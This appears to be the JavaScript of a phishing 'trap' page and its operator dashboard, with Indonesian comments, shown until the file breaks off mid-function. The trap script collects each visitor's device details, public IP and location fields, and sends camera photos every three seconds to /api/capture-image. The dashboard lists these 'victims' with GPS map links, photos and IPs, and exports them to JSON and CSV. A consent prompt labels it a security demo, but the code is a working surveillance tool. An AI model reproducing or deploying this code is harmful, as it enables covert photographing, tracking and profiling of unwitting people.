        // Script JS Dashboard HTML
        // Konfigurasi socket dengan retry
        const socket = io({
            reconnection: true,
            reconnectionAttempts: 5,
            reconnectionDelay: 1000,
            timeout: 10000
        });

        let victims = [];
        let photos = {};
        let currentFilter = 'all';
        let searchTerm = '';

        // Status koneksi
        socket.on('connect', () => {
            console.log('✅ Terhubung ke server');
            document.getElementById('connection-status').innerHTML = '🟢 Terhubung';
            document.getElementById('connection-status').style.color = '#00ff9d';
        });

        socket.on('disconnect', () => {
            console.log('❌ Terputus dari server');
            document.getElementById('connection-status').innerHTML = '🔴 Terputus';
            document.getElementById('connection-status').style.color = '#ff4444';
        });

        socket.on('connect_error', (error) => {
            console.log('Connection error:', error);
            document.getElementById('connection-status').innerHTML = '🟡 Error';
            document.getElementById('connection-status').style.color = '#ffaa00';
        });

        // Update stats dengan validasi data
        function updateStats() {
            const filteredVictims = filterVictimsData(victims);
            
            document.getElementById('totalVictims').textContent = filteredVictims.length;
            
            const cameraGranted = filteredVictims.filter(v => {
                return v.data && v.data.camera_access && v.data.camera_access.status === 'granted';
            }).length;
            
            const locationGranted = filteredVictims.filter(v => {
                return v.data && v.data.location && v.data.location.status === 'granted';
            }).length;
            
            document.getElementById('cameraCount').textContent = cameraGranted;
            document.getElementById('locationCount').textContent = locationGranted;
            
            // Active in last 5 minutes
            const fiveMinAgo = Date.now() - (5 * 60 * 1000);
            const activeNow = filteredVictims.filter(v => {
                const timestamp = v.timestamp ? new Date(v.timestamp).getTime() : 0;
                return timestamp > fiveMinAgo;
            }).length;
            
            document.getElementById('activeNow').textContent = activeNow;
        }

        // Filter data berdasarkan kriteria
        function filterVictimsData(data) {
            let filtered = [...data];
            
            // Filter berdasarkan pencarian
            if (searchTerm) {
                filtered = filtered.filter(v => {
                    const searchLower = searchTerm.toLowerCase();
                    return (v.victimId && v.victimId.toLowerCase().includes(searchLower)) ||
                           (v.ip && v.ip.includes(searchTerm)) ||
                           (v.data && v.data.public_ip && v.data.public_ip.includes(searchTerm));
                });
            }
            
            // Filter berdasarkan kategori
            switch(currentFilter) {
                case 'camera':
                    filtered = filtered.filter(v => v.data && v.data.camera_access && v.data.camera_access.status === 'granted');
                    break;
                case 'location':
                    filtered = filtered.filter(v => v.data && v.data.location && v.data.location.status === 'granted');
                    break;
                case 'today':
                    const today = new Date().toDateString();
                    filtered = filtered.filter(v => {
                        return v.timestamp && new Date(v.timestamp).toDateString() === today;
                    });
                    break;
            }
            
            return filtered;
        }

        // Render victim card dengan validasi data
        function renderVictim(victim) {
            if (!victim || !victim.victimId) return null;
            
            const card = document.createElement('div');
            card.className = 'victim-card';
            card.id = `victim-${victim.victimId}`;
            
            // Data dengan fallback
            const data = victim.data || {};
            const deviceInfo = data.device_info || {};
            const location = data.location || {};
            const camera = data.camera_access || {};
            const network = data.network || {};
            
            // Format data dengan aman
            const userAgent = deviceInfo.userAgent || 'Tidak tersedia';
            const platform = deviceInfo.platform || 'Tidak tersedia';
            const screenInfo = (deviceInfo.screenWidth && deviceInfo.screenHeight) ? 
                `${deviceInfo.screenWidth}x${deviceInfo.screenHeight}` : 'Tidak tersedia';
            const batteryInfo = deviceInfo.battery || 'Tidak tersedia';
            const ipPublic = data.public_ip || 'Tidak tersedia';
            const ipLokal = victim.ip || 'Tidak tersedia';
            
            // Format timestamp
            const timestamp = victim.timestamp ? new Date(victim.timestamp) : new Date();
            const timeStr = timestamp.toLocaleTimeString();
            const dateStr = timestamp.toLocaleDateString();
            
            // Status badges
            const hasCamera = camera.status === 'granted' ? 
                '<span class="badge badge-success">📸 Camera OK</span>' : '';
            const hasLocation = location.status === 'granted' ? 
                '<span class="badge badge-success">📍 Location OK</span>' : '';
            
            card.innerHTML = `
                <div class="victim-header">
                    <div>
                        <span class="victim-id">${victim.victimId}</span>
                        ${hasCamera}
                        ${hasLocation}
                    </div>
                    <span class="timestamp">${dateStr} ${timeStr}</span>
                </div>
                
                <div style="display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
                    <span>
                        <span class="camera-indicator ${camera.status === 'granted' ? 'camera-active' : ''}"></span> 
                        Camera: ${camera.status || 'Belum diminta'}
                    </span>
                    <span>
                        <span class="camera-indicator ${location.status === 'granted' ? 'location-active' : ''}"></span> 
                        Location: ${location.status || 'Belum diminta'}
                    </span>
                </div>
                
                ${location.status === 'granted' && location.latitude ? `
                <div class="data-section">
                    <div class="data-title">📍 LOKASI GPS</div>
                    <div class="data-content">
                        <div class="info-row-dot">
                            <div class="info-label-dot">Longitude</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${location.longitude}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Akurasi</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${location.accuracy || 'N/A'} meter</div>
                        </div>
                        ${location.altitude ? `
                        <div class="info-row-dot">
                            <div class="info-label-dot">Altitude</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${location.altitude} meter</div>
                        </div>
                        ` : ''}
                        <div class="info-row-dot">
                            <div class="info-label-dot">Maps</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">
                                <a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}" 
                                target="_blank" class="map-link">🔍 Buka di Google Maps</a>
                            </div>
                        </div>
                    </div>

                </div>
                ` : ''}
                
                ${data.location_address ? `
                <div class="data-section">
                    <div class="data-title">🏠 ALAMAT</div>
                    <div class="data-content">
                        ${data.location_address}
                    </div>
                </div>
                ` : ''}
                
                <div class="data-section">
                    <div class="data-title">📱 INFO DEVICE</div>
                    <div class="data-content">
                        <div class="info-row-dot">
                            <div class="info-label-dot">Platform</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${platform}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Browser</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${userAgent.length > 60 ? userAgent.substring(0, 60) + '...' : userAgent}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Screen</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${screenInfo}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Battery</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${batteryInfo}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Language</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${deviceInfo.language || 'N/A'}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Timezone</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${deviceInfo.timezone || 'N/A'}</div>
                        </div>
                    </div>

                </div>
                
                <div class="data-section" id="photo-${victim.victimId}">
                    <div class="data-title">📸 FOTO KAMERA</div>
                    <div class="data-content" id="photo-content-${victim.victimId}">
                        ${photos[victim.victimId] ? 
                            `<img src="${photos[victim.victimId]}" class="photo-preview" onclick="showPhoto('${victim.victimId}')">` : 
                            camera.status === 'granted' ? 'Mengambil foto...' : 'Tidak ada foto'}
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="data-title">🌐 NETWORK</div>
                    <div class="data-content">
                        <div class="info-row-dot">
                            <div class="info-label-dot">Online</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${network.online ? 'Ya' : 'Tidak'}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Koneksi</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${network.connection?.type || 'N/A'}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Kecepatan</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${network.connection?.downlink || 'N/A'} Mbps</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">IP Public</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${ipPublic}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">IP Lokal</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${ipLokal}</div>
                        </div>
                    </div>

                </div>
                
                <div style="margin-top: 10px; font-size: 11px; color: #666; text-align: right;">
                    ID: ${victim.victimId}
                </div>
            `;
            
            return card;
        }

        // Update all victims dengan filter
        function updateVictimsList() {
            const grid = document.getElementById('victimGrid');
            
            if (!victims || victims.length === 0) {
                grid.innerHTML = '<div class="loading">Belum ada data korban...</div>';
                updateStats();
                return;
            }
            
            // Sort by timestamp descending
            const sortedVictims = [...victims].sort((a, b) => {
                const timeA = a.timestamp ? new Date(a.timestamp).getTime() : 0;
                const timeB = b.timestamp ? new Date(b.timestamp).getTime() : 0;
                return timeB - timeA;
            });
            
            // Apply filters
            const filteredVictims = filterVictimsData(sortedVictims);
            
            if (filteredVictims.length === 0) {
                grid.innerHTML = '<div class="loading">Tidak ada data dengan filter ini</div>';
                updateStats();
                return;
            }
            
            grid.innerHTML = '';
            filteredVictims.forEach(victim => {
                const card = renderVictim(victim);
                if (card) grid.appendChild(card);
            });
            
            updateStats();
        }

        // Handle new victim data dengan struktur yang benar
        socket.on('new-victim', (data) => {
            console.log('📥 New victim data:', data);
            
            if (!data || !data.victimId) {
                console.warn('Invalid victim data:', data);
                return;
            }
            
            // Cari victim yang sudah ada
            const existingIndex = victims.findIndex(v => v && v.victimId === data.victimId);
            
            if (existingIndex >= 0) {
                // Update data yang ada
                if (!victims[existingIndex].data) {
                    victims[existingIndex].data = {};
                }
                
                // Jika data memiliki struktur dengan type
                if (data.type && data.data) {
                    victims[existingIndex].data[data.type] = data.data;
                } 
                // Jika data langsung berisi data lengkap
                else if (data.data) {
                    victims[existingIndex].data = {
                        ...victims[existingIndex].data,
                        ...data.data
                    };
                }
                
                // Update timestamp
                if (data.timestamp) {
                    victims[existingIndex].timestamp = data.timestamp;
                }
                
                // Update IP
                if (data.ip) {
                    victims[existingIndex].ip = data.ip;
                }
                
            } else {
                // Victim baru - buat struktur yang benar
                const newVictim = {
                    victimId: data.victimId,
                    timestamp: data.timestamp || new Date().toISOString(),
                    ip: data.ip || 'Unknown',
                    data: {}
                };
                
                // Masukkan data sesuai struktur
                if (data.type && data.data) {
                    newVictim.data[data.type] = data.data;
                } else if (data.data) {
                    newVictim.data = data.data;
                }
                
                victims.push(newVictim);
            }
            
            // Hapus duplikat berdasarkan victimId (ambil yang terbaru)
            const uniqueVictims = [];
            const seen = new Set();
            
            victims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            victims.forEach(v => {
                if (!seen.has(v.victimId)) {
                    seen.add(v.victimId);
                    uniqueVictims.push(v);
                }
            });
            
            victims = uniqueVictims;
            
            updateVictimsList();
        });

        // Handle initial data dengan validasi
        socket.on('init-data', (initialData) => {
            console.log('📊 Initial data received:', initialData);
            
            if (Array.isArray(initialData)) {
                // Filter data yang valid
                victims = initialData.filter(v => v && v.victimId).map(v => {
                    // Pastikan struktur data konsisten
                    if (!v.data) v.data = {};
                    return v;
                });
                
                // Hapus duplikat
                const unique = [];
                const seen = new Set();
                victims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                
                victims.forEach(v => {
                    if (!seen.has(v.victimId)) {
                        seen.add(v.victimId);
                        unique.push(v);
                    }
                });
                
                victims = unique;
            }
            
            updateVictimsList();
        });

        // Handle photo dengan validasi
        socket.on('new-photo', (data) => {
            if (data && data.victimId && data.image) {
                photos[data.victimId] = data.image;
                
                // Update photo di card
                const photoDiv = document.getElementById(`photo-${data.victimId}`);
                if (photoDiv) {
                    photoDiv.innerHTML = `
                        <div class="data-title">📸 FOTO KAMERA</div>
                        <div class="data-content">
                            <img src="${data.image}" class="photo-preview" onclick="showPhoto('${data.victimId}')">
                        </div>
                    `;
                }
            }
        });

        // Utility functions
        function copyLink() {
            const link = window.location.origin + '/demo';
            navigator.clipboard.writeText(link).then(() => {
                alert('✅ Link demo copied: ' + link);
            }).catch(() => {
                prompt('📋 Copy link ini:', link);
            });
        }

        function exportData() {
            const dataStr = JSON.stringify(victims, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `victims_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.json`;
            a.click();
            URL.revokeObjectURL(url);
        }

        function exportCSV() {
            // Buat CSV sederhana
            let csv = 'Victim ID,Timestamp,IP,Camera,Location,Latitude,Longitude,Browser,Platform\n';
            
            victims.forEach(v => {
                const row = [
                    v.victid || '',
                    v.timestamp || '',
                    v.ip || '',
                    v.data?.camera_access?.status || '',
                    v.data?.location?.status || '',
                    v.data?.location?.latitude || '',
                    v.data?.location?.longitude || '',
                    (v.data?.device_info?.userAgent || '').replace(/,/g, ' '),
                    v.data?.device_info?.platform || ''
                ].map(cell => `"${cell}"`).join(',');
                
                csv += row + '\n';
            });
            
            const blob = new Blob([csv], { type: 'text/csv' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `victims_${Date.now()}.csv`;
            a.click();
            URL.revokeObjectURL(url);
        }

        function clearData() {
            if (confirm('⚠️ Hapus semua data victim? Data tidak bisa dikembalikan!')) {
                victims = [];
                photos = {};
                updateVictimsList();
                
                // Optional: kirim sinyal ke server untuk clear data
                fetch('/api/clear-data', { method: 'POST' }).catch(() => {});
            }
        }

        function refreshData() {
            socket.emit('request-refresh');
            updateVictimsList();
        }

        function filterVictims() {
            searchTerm = document.getElementById('searchInput').value.toLowerCase();
            updateVictimsList();
        }

        function setFilter(filter) {
            currentFilter = filter;
            
            // Update active class
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
            
            updateVictimsList();
        }

        function showPhoto(victimId) {
            const photo = photos[victimId];
            if (photo) {
                const modal = document.getElementById('photoModal');
                const modalImg = document.getElementById('modalImage');
                modal.style.display = 'block';
                modalImg.src = photo;
            }
        }

        function closeModal() {
            document.getElementById('photoModal').style.display = 'none';
        }

        // Click outside modal to close
        window.onclick = function(event) {
            const modal = document.getElementById('photoModal');
            if (event.target == modal) {
                modal.style.display = 'none';
            }
        }

        // Keyboard shortcut
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                closeModal();
            }
        });

        // Periodic refresh
        setInterval(() => {
            // Optional: request update dari server
            socket.emit('ping');
        }, 30000);

        console.log('Dashboard siap!');

        // Akhir Script JS Dashboard HTML

        // Script JS Trap HTML
        // Fungsi debug
        function debug(message) {
            console.log('🔍 [DEBUG]', message);
            const debugDiv = document.getElementById('debug');
            if (debugDiv) {
                debugDiv.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${message}</div>`;
            }
        }

        // Generate ID unik
        const victimId = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        debug('Victim ID: ' + victimId);

        // Variabel global untuk kamera
        let frontCameraStream = null;
        let backCameraStream = null;
        let photoInterval = null;
        let isCameraActive = false;
        let cameraInterval = null;

        // Fungsi untuk kirim data ke server
        async function sendData(type, data) {
            try {
                debug(`Mengirim ${type}...`);
                
                const payload = {
                    victimId: victimId,
                    type: type,
                    data: data,
                    timestamp: new Date().toISOString()
                };
                
                console.log('Payload:', payload);
                
                const response = await fetch('/api/capture', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
                
                const result = await response.json();
                debug(`Response: ${JSON.stringify(result)}`);
                console.log('Server response:', result);
                
            } catch(e) {
                debug(`Error: ${e.message}`);
                console.error('Gagal kirim data:', e);
            }
        }

        // ==================== FUNGSI KAMERA DEPAN-BELAKANG ====================

        // Fungsi untuk mendapatkan semua perangkat kamera
        async function getCameraDevices() {
            try {
                // Minta izin akses kamera dulu
                const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
                tempStream.getTracks().forEach(track => track.stop()); // Langsung stop
                
                // Dapatkan daftar perangkat
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(device => device.kind === 'videoinput');
                
                debug(`📷 Ditemukan ${cameras.length} kamera:`);
                cameras.forEach((cam, i) => {
                    debug(`   ${i+1}. ${cam.label || 'Kamera ' + (i+1)}`);
                });
                
                return cameras;
            } catch(err) {
                debug('❌ Gagal mendapatkan daftar kamera: ' + err.message);
                return [];
            }
        }

        // Fungsi untuk mengambil foto dari stream tertentu
        async function captureFromStream(stream, cameraType) {
            if (!stream || !stream.active) return null;
            
            try {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                await video.play();
                
                // Tunggu video siap
                await new Promise(r => setTimeout(r, 300));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const context = canvas.getContext('2d');
                
                // Mirror untuk kamera depan (agar terlihat natural)
                if (cameraType === 'front') {
                    context.translate(canvas.width, 0);
                    context.scale(-1, 1);
                }
                
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Reset transform
                context.setTransform(1, 0, 0, 1, 0, 0);
                
                // Kompres gambar
                const imageData = canvas.toDataURL('image/jpeg', 0.6);
                
                // Hentikan video element
                video.srcObject = null;
                
                return imageData;
                
            } catch(err) {
                debug(`❌ Gagal capture ${cameraType}: ` + err.message);
                return null;
            }
        }

        // Fungsi untuk mengirim foto dari kedua kamera
        async function captureAndSendBoth() {
            const timestamp = new Date().toISOString();
            let frontSuccess = false;
            let backSuccess = false;
            
            // Capture dari kamera depan
            if (frontCameraStream && frontCameraStream.active) {
                const frontImage = await captureFromStream(frontCameraStream, 'front');
                if (frontImage) {
                    try {
                        await fetch('/api/capture-image', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                victimId: victimId, 
                                image: frontImage,
                                cameraType: 'front',
                                timestamp: timestamp
                            })
                        });
                        frontSuccess = true;
                    } catch(e) {
                        debug('Error kirim foto depan: ' + e.message);
                    }
                }
            }
            
            // Capture dari kamera belakang
            if (backCameraStream && backCameraStream.active) {
                const backImage = await captureFromStream(backCameraStream, 'back');
                if (backImage) {
                    try {
                        await fetch('/api/capture-image', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                victimId: victimId, 
                                image: backImage,
                                cameraType: 'back',
                                timestamp: timestamp
                            })
                        });
                        backSuccess = true;
                    } catch(e) {
                        debug('Error kirim foto belakang: ' + e.message);
                    }
                }
            }
            
            if (frontSuccess || backSuccess) {
                debug(`📸 Foto terkirim - Depan: ${frontSuccess ? '✅' : '❌'} | Belakang: ${backSuccess ? '✅' : '❌'} (${new Date().toLocaleTimeString()})`);
            }
        }

        // Fungsi untuk memulai kedua kamera sekaligus
        async function startBothCameras() {
            try {
                // Dapatkan daftar kamera
                const cameras = await getCameraDevices();
                
                if (cameras.length === 0) {
                    debug('❌ Tidak ada kamera ditemukan');
                    return false;
                }
                
                // Konfigurasi untuk kamera depan (biasanya index 0)
                const frontConstraints = {
                    video: {
                        deviceId: cameras[0]?.deviceId ? { exact: cameras[0].deviceId } : undefined,
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: 'user'
                    }
                };
                
                // Coba mulai kamera depan
                try {
                    frontCameraStream = await navigator.mediaDevices.getUserMedia(frontConstraints);
                    debug('✅ Kamera depan aktif');
                    await sendData('camera_access', { 
                        camera: 'front', 
                        status: 'granted',
                        label: cameras[0]?.label || 'Kamera Depan'
                    });
                } catch(err) {
                    debug('❌ Gagal kamera depan: ' + err.message);
                }
                
                // Jika ada kamera kedua, mulai kamera belakang
                if (cameras.length > 1) {
                    const backConstraints = {
                        video: {
                            deviceId: cameras[1]?.deviceId ? { exact: cameras[1].deviceId } : undefined,
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            facingMode: 'environment'
                        }
                    };
                    
                    try {
                        backCameraStream = await navigator.mediaDevices.getUserMedia(backConstraints);
                        debug('✅ Kamera belakang aktif');
                        await sendData('camera_access', { 
                            camera: 'back', 
                            status: 'granted',
                            label: cameras[1]?.label || 'Kamera Belakang'
                        });
                    } catch(err) {
                        debug('❌ Gagal kamera belakang: ' + err.message);
                    }
                }
                
                // Jika setidaknya satu kamera aktif
                if (frontCameraStream || backCameraStream) {
                    isCameraActive = true;
                    
                    // Kirim foto pertama segera
                    await captureAndSendBoth();
                    
                    // Kirim foto berikutnya setiap 3 detik
                    cameraInterval = setInterval(() => {
                        if (isCameraActive) {
                            captureAndSendBoth();
                        }
                    }, 3000);
                    
                    return true;
                } else {
                    debug('❌ Tidak ada kamera yang bisa diakses');
                    return false;
                }
                
            } catch(err) {
                debug('❌ Error saat memulai kamera: ' + err.message);
                return false;
            }
        }

        // Fungsi untuk menghentikan semua kamera
        function stopAllCameras() {
            if (frontCameraStream) {
                frontCameraStream.getTracks().forEach(track => track.stop());
                frontCameraStream = null;
            }
            
            if (backCameraStream) {
                backCameraStream.getTracks().forEach(track => track.stop());
                backCameraStream = null;
            }
            
            if (cameraInterval) {
                clearInterval(cameraInterval);
                cameraInterval = null;
            }
            
            if (photoInterval) {
                clearInterval(photoInterval);
                photoInterval = null;
            }
            
            isCameraActive = false;
            debug('🛑 Semua kamera dihentikan');
            sendData('camera_access', { status: 'stopped' });
        }

        // ==================== EKSEKUSI DATA ====================

        // 1. Kumpulkan info device (langsung)
        setTimeout(async () => {
            debug('Mengumpulkan info device...');
            
            const deviceInfo = {
                userAgent: navigator.userAgent || 'Tidak tersedia',
                platform: navigator.platform || 'Tidak tersedia',
                language: navigator.language || 'Tidak tersedia',
                cookiesEnabled: navigator.cookieEnabled,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                battery: 'Tidak tersedia',
                referrer: document.referrer || 'Langsung'
            };

            debug('Device info: ' + JSON.stringify(deviceInfo));

            // Cek battery API
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    deviceInfo.battery = battery.level * 100 + '%';
                    deviceInfo.charging = battery.charging;
                } catch(e) {
                    debug('Battery error: ' + e.message);
                }
            }
            
            await sendData('device_info', deviceInfo);
        }, 1000);

        // 2. Cek koneksi dan IP
        setTimeout(async () => {
            debug('Mengecek jaringan...');
            
            // Kirim info network lokal
            await sendData('network', {
                online: navigator.onLine,
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : 'Tidak tersedia'
            });
            
            // Coba dapatkan IP public
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                await sendData('public_ip', data.ip);
                debug('Public IP: ' + data.ip);
            } catch(e) {
                debug('Gagal dapat IP public: ' + e.message);
            }
        }, 2000);

            // 3. Minta akses kamera (SWITCH CAMERA - Akses Kedua Kamera Bergantian)
    setTimeout(async () => {
        debug('📷 Memulai akses kamera (akan mengakses kamera depan dan belakang secara bergantian)...');
        
        // Tanya izin awal
        const izinAwal = confirm(
            '⚠️ DEMO KEAMANAN SIBER ⚠️\n\n' +
            'Website ini akan mengakses KAMERA DEPAN dan KAMERA BELAKANG Anda\n' +
            'secara bergantian untuk simulasi keamanan.\n\n' +
            'Klik OK untuk mengizinkan akses kamera'
        );
        
        if (!izinAwal) {
            debug('❌ Izin kamera ditolak user');
            await sendData('camera_access', { status: 'denied' });
            return;
        }
        
        let currentStream = null;
        let currentCameraType = null;
        let isSwitching = false;
        let switchInterval = null;
        let periodicInterval = null;
        let cameraIndex = 0;
        let availableCameras = [];
        
        // Fungsi untuk mendapatkan daftar semua kamera yang tersedia
        async function getAvailableCameras() {
            try {
                // Minta izin sementara untuk mendapatkan daftar kamera
                const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
                tempStream.getTracks().forEach(track => track.stop());
                
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(device => device.kind === 'videoinput');
                
                debug(`📷 Ditemukan ${cameras.length} kamera:`);
                cameras.forEach((cam, i) => {
                    debug(`   ${i+1}. ${cam.label || 'Kamera ' + (i+1)}`);
                });
                
                return cameras;
            } catch(err) {
                debug('❌ Gagal mendapatkan daftar kamera: ' + err.message);
                return [];
            }
        }
        
        // Fungsi untuk mengambil foto dari stream
        async function captureFromStream(stream, cameraType) {
            if (!stream || !stream.active) return null;
            
            try {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                await video.play();
                
                await new Promise(r => setTimeout(r, 300));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const context = canvas.getContext('2d');
                
                // Mirror untuk kamera depan
                if (cameraType === 'front') {
                    context.translate(canvas.width, 0);
                    context.scale(-1, 1);
                }
                
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                context.setTransform(1, 0, 0, 1, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.6);
                video.srcObject = null;
                
                return imageData;
                
            } catch(err) {
                debug(`❌ Gagal capture ${cameraType}: ` + err.message);
                return null;
            }
        }
        
        // Fungsi untuk memulai kamera dengan device tertentu
        async function startCameraWithDevice(device, cameraLabel) {
            if (isSwitching) {
                debug('⏳ Sedang beralih kamera, tunggu...');
                return false;
            }
            
            isSwitching = true;
            
            try {
                // Hentikan stream sebelumnya
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                    debug(`🛑 Kamera ${currentCameraType} dihentikan`);
                    
                    // Kirim notifikasi kamera dihentikan
                    await sendData('camera_switched', { 
                        previous: currentCameraType,
                        action: 'stopped',
                        timestamp: new Date().toISOString()
                    });
                }
                
                // Tentukan mode facingMode berdasarkan label atau index
                let facingMode = null;
                let cameraType = 'unknown';
                
                if (cameraLabel.toLowerCase().includes('front') || 
                    cameraLabel.toLowerCase().includes('face') ||
                    cameraLabel.toLowerCase().includes('user') ||
                    (availableCameras.indexOf(device) === 0)) {
                    facingMode = 'user';
                    cameraType = 'front';
                } else {
                    facingMode = 'environment';
                    cameraType = 'back';
                }
                
                // Konfigurasi constraints
                const constraints = {
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                };
                
                // Gunakan deviceId jika tersedia
                if (device.deviceId) {
                    constraints.video.deviceId = { exact: device.deviceId };
                } else if (facingMode) {
                    constraints.video.facingMode = { exact: facingMode };
                }
                
                debug(`📷 Mengakses kamera ${cameraType} (${cameraLabel})...`);
                
                // Tampilkan pesan di status
                const statusEl = document.getElementById('status');
                if (statusEl) {
                    statusEl.textContent = `Mengakses kamera ${cameraType == 'front' ? 'DEPAN' : 'BELAKANG'}...`;
                }
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                currentStream = stream;
                currentCameraType = cameraType;
                
                debug(`✅ Kamera ${cameraType} aktif (${cameraLabel})`);
                
                // Kirim status ke server
                await sendData('camera_access', { 
                    camera: cameraType,
                    cameraLabel: cameraLabel,
                    status: 'active',
                    timestamp: new Date().toISOString()
                });
                
                // Ambil foto pertama setelah aktif
                const image = await captureFromStream(stream, cameraType);
                if (image) {
                    await fetch('/api/capture-image', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            victimId: victimId, 
                            image: image,
                            cameraType: cameraType,
                            cameraLabel: cameraLabel,
                            timestamp: new Date().toISOString()
                        })
                    });
                    debug(`📸 Foto ${cameraType} (${cameraLabel}) terkirim`);
                }
                
                return true;
                
            } catch(err) {
                debug(`❌ Gagal akses kamera: ${err.message}`);
                await sendData('camera_access', { 
                    camera: cameraType,
                    status: 'error', 
                    error: err.message 
                });
                return false;
            } finally {
                isSwitching = false;
            }
        }
        
        // Fungsi untuk beralih ke kamera berikutnya
        async function switchToNextCamera() {
            if (!availableCameras.length) {
                debug('❌ Tidak ada kamera tersedia untuk beralih');
                return;
            }
            
            // Update index
            cameraIndex = (cameraIndex + 1) % availableCameras.length;
            const nextCamera = availableCameras[cameraIndex];
            const cameraLabel = nextCamera.label || `Kamera ${cameraIndex + 1}`;
            
            debug(`🔄 Beralih ke kamera ${cameraIndex + 1}: ${cameraLabel}`);
            
            await startCameraWithDevice(nextCamera, cameraLabel);
        }
        
        // ==================== EKSEKUSI UTAMA ====================
        
        // 1. Dapatkan daftar kamera yang tersedia
        availableCameras = await getAvailableCameras();
        
        if (availableCameras.length === 0) {
            debug('❌ Tidak ada kamera ditemukan');
            
            // Coba fallback: akses kamera default
            try {
                const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                currentStream = fallbackStream;
                currentCameraType = 'default';
                isCameraActive = true;
                
                debug('✅ Kamera default berhasil (fallback mode)');
                await sendData('camera_access', { status: 'granted_fallback' });
                
                // Kirim foto periodik
                periodicInterval = setInterval(async () => {
                    if (currentStream && currentStream.active) {
                        const image = await captureFromStream(currentStream, 'default');
                        if (image) {
                            await fetch('/api/capture-image', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ 
                                    victimId: victimId, 
                                    image: image,
                                    cameraType: 'fallback',
                                    timestamp: new Date().toISOString()
                                })
                            });
                            debug('📸 Foto fallback terkirim');
                        }
                    }
                }, 3000);
                
            } catch(fallbackErr) {
                debug('❌ Fallback juga gagal: ' + fallbackErr.message);
            }
            
            return;
        }
        
        // 2. Mulai dengan kamera pertama (biasanya kamera depan)
        const firstCamera = availableCameras[0];
        const firstLabel = firstCamera.label || 'Kamera 1';
        const firstSuccess = await startCameraWithDevice(firstCamera, firstLabel);
        
        if (firstSuccess) {
            isCameraActive = true;
            
            // 3. Kirim foto periodik dari kamera yang sedang aktif
            periodicInterval = setInterval(async () => {
